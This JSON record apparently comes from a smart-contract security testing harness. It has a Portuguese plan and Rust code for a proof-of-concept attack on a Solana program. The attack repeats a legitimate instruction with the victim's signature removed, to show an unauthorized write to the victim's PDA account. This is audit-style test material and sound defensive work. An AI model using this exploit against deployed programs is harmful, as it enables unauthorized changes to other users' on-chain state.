{
  "plan": "O atacante conhece a pubkey da vitima (user) mas nao a controla. Ele deriva o PDA valido ["data", user.key()] e monta a conta data_account com esse endereco, alem da conta user sem assinatura. O baseline usa a mesma instrucao com a vitima assinando (uso legitimo) para provar que o cenario esta correto. O ataque repete a chamada removendo a assinatura da vitima; se o programa gravar a pubkey da vitima e o valor no estado, a escrita nao autorizada e confirmada.",
  "scenario": "let victim = Pubkey::new_unique();
let (pda, _bump) = Pubkey::find_program_address(&[b"data", victim.as_ref()], &env.program_id);

let data_account = account(&env.program_id, &[0u8; 49], None);
let victim_account = account(&solana_sdk::system_program::id(), &[], None);

let value: u64 = 42;
let mut ix_data = vec![1u8];
ix_data.extend_from_slice(&value.to_le_bytes());

let metas = vec![
    AccountMeta::new(pda, false),
    AccountMeta::new_readonly(victim, true),
];
let ix = env.raw_ix(&ix_data, metas);
let contas = vec![
    (pda, data_account.clone()),
    (victim, victim_account.clone()),
];

let base = env.baseline("uso legitimo: vitima assina", &ix, &contas);

let metas_attack = vec![
    AccountMeta::new(pda, false),
    AccountMeta::new_readonly(victim, false),
];
let ix_attack = env.raw_ix(&ix_data, metas_attack);
let contas_attack = vec![
    (pda, data_account),
    (victim, victim_account),
];

let r = env.attack("escrita sem assinatura da vitima", &ix_attack, &contas_attack);
if r.program_result == ProgramResult::Success {
    let d = after(&r, &pda).data();
    env.effect("pubkey da vitima gravada sem assinatura", read_pubkey(d, 8) == victim);
    env.effect("valor gravado sem assinatura", read_u64(d, 40) == value);
}"
}

